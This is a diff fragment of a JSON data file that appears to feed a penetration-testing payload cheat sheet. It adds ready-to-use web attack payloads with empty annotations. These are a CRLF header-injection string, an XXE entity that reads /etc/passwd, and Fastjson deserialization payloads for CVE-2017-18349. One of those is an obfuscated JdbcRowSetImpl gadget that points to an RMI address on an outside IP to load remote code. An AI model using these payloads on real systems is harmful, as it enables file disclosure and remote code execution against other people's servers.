+							]
+						}]
+					}
+				]
+			}
+		]
+	},
+	{
+		"left-nav-title": "CLRF",
+		"card-item-content": [{
+				"card-item-header": "回车换行符",
+				"card-item-body": [{
+						"card-item-h4": "\\r  \\n",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"%0d%0aSet-Cookie: CLRF=true"
+							],
+							"annotation": [
+								""
+							]
+						}]
+					}
+				]
+			}
+		]
+	},
+	{
+		"left-nav-title": "XXE",
+		"card-item-content": [{
+				"card-item-header": "XML实体注入",
+				"card-item-body": [{
+						"card-item-h4": "读文件",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"'><?xml version=\"1.0\" encoding=\"utf-8\"?> <!DOCTYPE a [ <!ENTITY test SYSTEM \"file:///etc/passwd\"> ]> <c>&test;</c>	<'"
+							],
+							"annotation": [
+								""
+							]
+						}]
+					}
+				]
+			}
+		]
+	},
+	{
+		"left-nav-title": "Fastjson",
+		"card-item-content": [{
+				"card-item-header": "CVE-2017-18349",
+				"card-item-body": [{
+						"card-item-h4": "@type",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"{\"e\":{\"@type\":\"java.net.Inet4Address\",\"val\":\"hbs9jr.dnslog.cn\"}}",
+								"{\"dik1xu\": {\"\\u0040t\\u0079\\u0070\\u0065\":\"L\\u0063om.su\\u006E.rows\\u0065\\x74.\\x4A\\u0064\\u0062cRo\\u0077SetIm\\x70l;\",\"dataSourceName\": \"rmi://106.52.238.135:8001/i/hcSvqI7U/a1da25/hnm3/gyoz/PQ5P8iBh/\",\"autoCommit\": true}}"
+							],
+							"annotation": [
+								"",
+								""
+							]
+						}]
+					}
+				]
+			}
+		]
+	}
+])
